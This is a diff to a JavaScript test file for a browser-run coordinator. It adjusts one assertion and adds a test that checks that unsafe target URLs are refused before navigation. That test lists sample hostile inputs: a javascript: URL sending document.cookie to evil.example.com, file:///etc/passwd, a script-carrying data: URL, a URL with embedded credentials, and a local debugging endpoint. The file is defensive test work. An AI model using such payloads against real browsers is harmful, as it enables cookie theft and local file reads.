@@ -759,7 +759,9 @@ test('an unusable recreation snapshot is refused before the registry is rebound'
   );
   assert.equal(result.outcome, 'recheck-failed');
   assert.deepEqual(registry.updates, []); // never rebound to the unusable target
-  assert.deepEqual(closed, []); // and the original was NOT closed
+  // Round 12: the unusable target was still CREATED, so it must be closed (the controller
+  // frees transport resources only via closeTarget) -- but the ORIGINAL is left alone.
+  assert.deepEqual(closed, ['page:recreated-1']);
 });
 
 // Codex re-review of PR #5 round 10 (P2): when the post-recreation retry recheck fails, the
@@ -889,5 +891,31 @@ test('a foreign intentId is refused; the run intent is authoritative', async () 
       { runId: 'run_ac_001', expectedVersion: completed.checkpoint.version, requestId, browserSessionRef: 'session:abc-1', pageTargetRef: 'page:t-1', targetUrl: 'https://example.com/account', intentId: 'intent_mine_001', now: NOW },
     );
     assert.equal(result.outcome, 'evidence-recorded');
+  }
+});
+
+// Codex re-review of PR #5 round 12 (P1): AUTHORIZED is not SAFE. intentSnapshot is stored as
+// `unknown` and the Intent contract constrains no schemes, so a run can carry a dangerous
+// destination as its own recorded intent; an exactly-matching targetUrl would otherwise reach
+// the rechecker's navigating probe (script execution / local file read / leaked credentials).
+test('an unsafe intent URL is refused even when the caller matches it exactly', async () => {
+  for (const unsafe of [
+    'javascript:fetch("https://evil.example.com/"+document.cookie)',
+    'file:///etc/passwd',
+    'data:text/html,<script>1</script>',
+    'https://user:secret@example.com/account', // embedded credentials
+    'http://127.0.0.1:9222/json/version', // the daemon's own CDP endpoint
+  ]) {
+    const { coordinator } = makeCoordinator();
+    const { requestId, completed } = await toCompletedIntervention(coordinator, 'run_ac_001', { target: { kind: 'url', value: unsafe } });
+    let recheckCalls = 0;
+    const result = await resumeBrowserRun(
+      { coordinator, rechecker: new FakeBrowserAuthRechecker(() => { recheckCalls += 1; return { ok: true, confidence: 1, diagnostics: [] }; }),
+        session: await startedSession([safeObs('o1')]), sessionRegistry: defaultRegistry() },
+      { runId: 'run_ac_001', expectedVersion: completed.checkpoint.version, requestId, browserSessionRef: 'session:abc-1', pageTargetRef: 'page:t-1', targetUrl: unsafe, now: NOW },
+    );
+    assert.equal(result.outcome, 'recheck-failed', unsafe);
+    assert.equal(result.recheckCode, 'unsafe-target', unsafe);
+    assert.equal(recheckCalls, 0, `${unsafe} must never reach the navigating probe`);
   }
 });
